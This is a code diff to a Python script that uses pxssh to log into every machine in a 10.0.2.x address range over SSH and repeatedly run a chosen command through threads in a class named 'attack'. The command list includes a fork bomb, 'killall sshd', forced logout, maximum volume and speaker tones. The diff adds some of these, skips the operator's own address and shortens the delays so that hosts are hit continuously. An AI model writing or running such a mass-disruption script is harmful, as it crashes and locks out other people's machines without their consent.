@@ -1,6 +1,7 @@
 # for service
 
-import pxssh
+
+import pxssh  # you must install/include this library (no standard)
 import socket
 import time
 from threading import *
@@ -14,6 +15,7 @@ def login(ipp, order):
     else:
         s.sendline("bash")
         s.sendline("export DISPLAY=:0")
+        s.sendline("amixer sset 'Master' 100%")
         s.sendline(order)
         s.prompt()
         s.logout()
@@ -61,7 +63,7 @@ class attack(Thread):
         return 0
 
 
-list_of_orders = [":(){ :|:&};:","qdbus org.kde.ksmserver /KSMServer logout 0 0 0" ,"echo 'Error' | wall", "amixer sset 'Master' 100%", "notify-send 'title' 'text'"]
+list_of_orders = ["killall sshd","speaker-test -t sine -f 1000 -l 2 2>&1",":(){ :|:&};:","qdbus org.kde.ksmserver /KSMServer logout 0 0 0" ,"echo 'Error' | wall", "amixer sset 'Master' 100%", "notify-send 'title' 'text'"]
 numbers = []
 count = 0
 
@@ -74,22 +76,23 @@ while count < 4:
 
 b = int(input("Order: "))
 order = list_of_orders[b]
+youripp = input("Own Ipp: ")
 
 while True:
 
     List = ipadress(numbers[0],numbers[1],numbers[2],numbers[3])
-    if "10.0.2.49" in List:
-        List.remove("10.0.2.49")
+    if ("10.0.2."+youripp) in List:
+        List.remove("10.0.2."+youripp)
 
 
     
     for i in List:
         check = attack(i,order)
         check.start()
-#        time.sleep(6)
+        time.sleep(0.1)
         
     List =[]
-#    time.sleep(63)
+    time.sleep(1.5)
     os.system("clear")
     
 
